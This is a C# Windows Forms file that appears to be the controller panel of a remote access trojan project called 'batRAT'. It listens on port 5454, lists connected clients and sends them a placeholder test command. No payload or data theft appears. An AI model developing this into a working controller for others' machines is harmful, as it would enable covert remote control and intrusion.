using System;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

using Server.Core;
using batRAT.Commands;

namespace Server.Forms {
    public partial class frmMain : Form {

        bServer server;

        public frmMain() {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e) {
            button1.Enabled = false;
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, 5454);
            server = new bServer(ipEndPoint);
            server.OnClientAccepted += (soc) => {
                IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
                this.Invoke((MethodInvoker)(() => listBox1.Items.Add(ip.Address.ToString())));
            };

            server.OnDataSent += (soc, bytes) => {
                IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
                MessageBox.Show(bytes + " bytes sent to " + ip.Address + "!", "Data Sent!");
            };
            server.StartListen();            
        }

        private void button2_Click(object sender, EventArgs e) {
            if(listBox1.Items.Count > 0) {
                if(server.allConnections.Count > 0) {
                    int selectedIndex = listBox1.SelectedIndex;
                    Socket selectedSocket = server.allConnections[selectedIndex];
                    TestCommand testCommand = new TestCommand();
                    testCommand.Message = "Test Command";
                    server.Send<TestCommand>(testCommand, selectedSocket);
                }
            }
        }
    }
}
